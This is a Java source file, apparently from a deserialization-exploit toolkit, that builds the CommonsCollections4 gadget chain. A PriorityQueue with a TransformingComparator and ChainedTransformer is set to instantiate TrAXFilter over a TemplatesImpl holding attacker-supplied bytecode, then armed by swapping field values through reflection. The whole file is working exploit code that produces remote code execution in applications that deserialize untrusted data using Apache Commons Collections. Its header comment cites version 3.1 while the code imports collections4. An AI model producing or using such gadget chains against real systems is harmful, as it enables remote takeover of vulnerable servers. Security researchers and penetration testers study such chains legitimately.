package marshalsec.gadgets;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import java.util.PriorityQueue;
import java.util.Queue;
import javax.xml.transform.Templates;
import marshalsec.UtilFactory;
import marshalsec.util.Gadgets;
import marshalsec.util.Reflections;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

/*
 * Variation on CommonsCollections2 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */

/**
 * commons-collections:commons-collections:3.1
 */
public interface CommonsCollections4 extends Gadget {

	default Queue<Object> makeCommonsCollections4(UtilFactory uf, String[] args) throws Exception {
		Object templates = Gadgets.createTemplatesImpl(args[0]);

		ConstantTransformer constant = new ConstantTransformer(String.class);

		// mock method name until armed
		Class[] paramTypes = new Class[] { String.class };
		Object[] argsx = new Object[] { "foo" };
		InstantiateTransformer instantiate = new InstantiateTransformer(
				paramTypes, argsx);

		// grab defensively copied arrays
		paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
		argsx = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

		ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });

		// create queue with numbers
		PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
		queue.add(1);
		queue.add(1);

		// swap in values to arm
		Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
		paramTypes[0] = Templates.class;
		argsx[0] = templates;

		return queue;
	}

}
